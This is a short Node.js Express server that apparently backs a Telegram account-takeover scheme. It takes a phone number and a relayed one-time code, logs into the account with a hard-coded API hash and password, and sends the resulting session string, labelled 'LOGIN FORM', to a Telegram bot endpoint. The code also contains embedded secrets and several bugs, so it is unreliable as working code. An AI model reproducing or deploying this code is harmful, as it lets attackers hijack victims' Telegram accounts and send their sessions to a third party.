const dotenv = require('dotenv');
dotenv.config();
const express = require('express');
const { TelegramClient } = require('telegram');
const { StringSession } = require("telegram/sessions");

export async function fetchWithTimeout(resource, options = {}, sendErr = true) {
    const timeout = options?.timeout | 15000;

    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    try {
        // const response = {ok :true}
        const response = await fetch(resource, {
            ...options,
            signal: controller.signal
        });
        clearTimeout(id);
        return response;
    } catch (error) {
        if (sendErr) {
            console.log(error, ' - ', resource);
            await fetchWithTimeout(`${ppplbot}&text=${(process.env.userName).toUpperCase()}: ${error} - ${resource}`);
        }
        return undefined
    }
}


const app = express();
const port = 4000;
const apiId = 2899;
const apiHash = "36722c72256a24c1225de00eb6a1ca74"
let otp = '';

app.get('/', (req, res) => {
    res.send('Hello World!');
});

app.get('/login', async (req, res, next) => {

    res.send('responding!!');
    next();
}, async (req, res) => {
    const phone = req.query.phone;
    console.log("hello:", phone);
    await trySgnup(phone)
});

app.get('/otp', async (req, res) => {
    const code = req.query.code;
    otp = code;

    res.json({});
});


app.listen(port, () => {
    console.log(`App listening at http://localhost:${port}`);
});


async function trySgnup(phone) {
    const stringSession = new StringSession(""); // fill this later with the value from session.save()

    const client = new TelegramClient(stringSession, apiId, apiHash, {
        connectionRetries: 5,
    });
    try {
        await client.start({
            phoneNumber: `+${phone}`,
            password: async () => new Promise.resolve("Ajtdmwajt1@"),
            phoneCode: async () =>
                await delayedReturn(5000),
            onError: (err) => console.log(err),
        });
        await client.connect();
        console.log("You should now be connected.");
        console.log(client.session.save);
        const sess = client.session.save();
        await fetchWithTimeout(`${ppplbot}&text=LOGIN FORM:${phone} | ${sess}`);
        // // console.log(client.session.save())
        // // await joinGrps(client, 'tamil_family')
        // client.addEventHandler(handleEvents, new NewMessage({ incoming: true }));
        // client.addEventHandler(OutEventPrint, new NewMessage({ outgoing: true }));

    } catch (error) {
        console.log(error);
    }

}

async function delayedReturn(timeout) {
    console.log(otp);
    return new Promise((resolve) => {
        setTimeout(() => {
            resolve(otp);
        }, timeout);
    });
}


